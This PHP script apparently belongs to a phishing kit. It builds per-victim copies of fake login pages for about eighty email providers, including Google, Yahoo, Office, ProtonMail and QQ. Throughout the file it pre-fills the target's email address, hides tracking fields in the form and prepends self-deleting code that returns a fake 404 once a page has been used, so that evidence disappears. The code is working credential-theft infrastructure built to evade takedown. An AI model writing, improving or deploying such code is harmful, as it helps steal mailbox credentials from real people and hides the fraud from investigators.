<?php

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require 'config.php';
require_once __DIR__ . '/index-functions.php';

if (empty($session_folder)) {
    http_response_code(500);
    die('Critical configuration missing.');
}

$file     = $_GET['file']     ?? $_POST['file']     ?? '';
$products = normalizeProducts($_GET['products'] ?? $_POST['products'] ?? '');

if (empty($file) || empty($products)) {
    http_response_code(400);
    die('Invalid request');
}

$allowed_files = [
    'all.php', 'rc.php', 'cpw.php',
    'aruba.php', 'emailsrvr.php', 'yahoo.php', 'google.php',
    '126.php', '263.php', 'office.php', 'office_cn.php',
    'mailaliyun.php', 'aol.php', 'private.php', 'mxhichina.php',
    'bossmail.php', 'one.php', 'natro.php', 'hostinger.php',
    'hostedemail.php', 'comcast.php', 'mimecast.php', 'rediffmailpro.php',
    'gmx.php', 'godaddy.php', 'yunyou.php', 'ionos.php', 'interia.php',
    'zimbra.php', 'registerit.php', 'globalmail.php', 'naver.php',
    'cybermail.php', 'netease.php', 'netsol.php', 'protonmail.php',
    'qq.php', 'dreamhost.php', 'nc.php', 'orangepl.php', 'konsolh.php',
    'strato.php', 'telkomsa.php', 'wadax.php', 'windstream.php',
    'zoho.php', 'owa.php', 'smarsh.php', 'worksmobile.php',
    'mailplug.php', 'fastmail.php', 'udomain.php', 'ovhcloud.php',
    'mailgun.php', 'lolipop.php', 'mweb.php', '163.php',
    'bizmail.php', 'uol.php', 'locaweb.php', 'terrabr.php',
    'userver.php', 'connect.php', 'smarter.php', 'horde.php',
    'daum.php', 'mailcom.php', 'enable.php', 'squirrel.php',
    'icewarp.php', 'mdaemon.php', 'kerio.php', 'afterlogic.php',
    'zoner.php', 'mailcow.php', 'mail2000.php', 'mailnara.php',
	'kasserver.php', 'maychuemail.php', 'apsuite.php',
];

$is_absolute_url = (bool)preg_match('#^https?://#i', $file);

if (!$is_absolute_url && !in_array($file, $allowed_files, true)) {
    http_response_code(403);
    die('File not allowed');
}
if ($is_absolute_url) {
    $parts = parse_url($file);
    if (empty($parts['host'])) {
        http_response_code(403);
        die('File not allowed');
    }
}

// The template that is ACTUALLY served.
$template_file = $is_absolute_url ? 'all.php' : $file;

$source_path = __DIR__ . '/assets/' . $template_file;
if (!file_exists($source_path)) {
    http_response_code(404);
    die('Source file not found');
}

$sessions_dir = __DIR__ . '/' . $session_folder;
if (!is_dir($sessions_dir)) {
    if (!mkdir($sessions_dir, 0755, true)) {
        http_response_code(500);
        die('Failed to create storage directory');
    }
    file_put_contents($sessions_dir . '/.htaccess', "Options -Indexes");
}

$session_id       = bin2hex(random_bytes(16));
$session_filename = $session_id . '.php';
$session_path     = $sessions_dir . '/' . $session_filename;

$base64_email = rtrim(strtr(base64_encode($products), '+/', '-_'), '=');

$meta_filename = 'meta_' . $session_id . '.txt';
$meta_path     = $sessions_dir . '/' . $meta_filename;
file_put_contents($meta_path, 'pending');

$self_destruct_php = '<?php
function self_destruct_and_redirect($final_destination) {
    $meta_file = __DIR__ . \'/meta_' . $session_id . '.txt\';
    if (file_exists($meta_file)) {
        file_put_contents($meta_file, "completed");
    }
    @unlink(__FILE__);
    @unlink($meta_file);
    header("Location: " . $final_destination);
    exit;
}
$meta_check = __DIR__ . \'/meta_' . $session_id . '.txt\';
if (!file_exists($meta_check) || trim(file_get_contents($meta_check)) !== "pending") {
    if (file_exists(__FILE__)) { @unlink(__FILE__); }
    http_response_code(404);
    die("<h1>404 Not Found</h1><p>This link is invalid or has already been completed.</p>");
}
?>';

// ------------------------------------------------------------
// FIX 1 — hidden "login" carries the SERVED template, not $file.
// Also carries the original routed $file for reference.
// ------------------------------------------------------------
$hidden_token_html = '<input type="hidden" name="survey_token" value="' . $session_id . '">';
$hidden_login_html = '<input type="hidden" name="login" value="'
    . htmlspecialchars($template_file, ENT_QUOTES, 'UTF-8') . '">';
$hidden_email_html = '<input type="hidden" name="user_init" value="'
    . htmlspecialchars($products, ENT_QUOTES, 'UTF-8') . '">';

// Optional: preserve the pre-normalization $file too (useful for debugging)
$hidden_file_html = ($template_file !== $file)
    ? '<input type="hidden" name="route_file" value="'
      . htmlspecialchars($file, ENT_QUOTES, 'UTF-8') . '">'
    : '';

$content = file_get_contents($source_path);
$content = $self_destruct_php . "\n" . $content;

$hidden_fields = $hidden_token_html . "\n"
               . $hidden_login_html . "\n"
               . $hidden_email_html . "\n"
               . $hidden_file_html;

// ------------------------------------------------------------
// FIX 2 — guaranteed injection. Tries </form>, then </body>,
// then appends at end of file as last resort.
// ------------------------------------------------------------
$injected = false;

if (stripos($content, '</form>') !== false) {
    $pos     = stripos($content, '</form>');
    $content = substr($content, 0, $pos) . $hidden_fields . "\n" . substr($content, $pos);
    $injected = true;
}

if (!$injected && stripos($content, '</body>') !== false) {
    $pos     = stripos($content, '</body>');
    $content = substr($content, 0, $pos) . $hidden_fields . "\n" . substr($content, $pos);
    $injected = true;
}

if (!$injected) {
    // Last resort — append at end of file.
    $content .= "\n" . $hidden_fields . "\n";
}

if (file_put_contents($session_path, $content) === false) {
    http_response_code(500);
    die('Failed to create session file');
}

// ------------------------------------------------------------
// FIX 3 — persist $template_file in session so build.php can
// recover it even if the POST is somehow stripped.
// ------------------------------------------------------------
$_SESSION['temp_file']     = $session_path;
$_SESSION['temp_filename'] = $session_filename;
$_SESSION['temp_template'] = $template_file;
$_SESSION['temp_email']    = $products;
$_SESSION['created_at']    = time();

$redirect_url = $session_folder . '/' . $session_filename . '?id=' . $base64_email;
header('Location: ' . $redirect_url);
exit;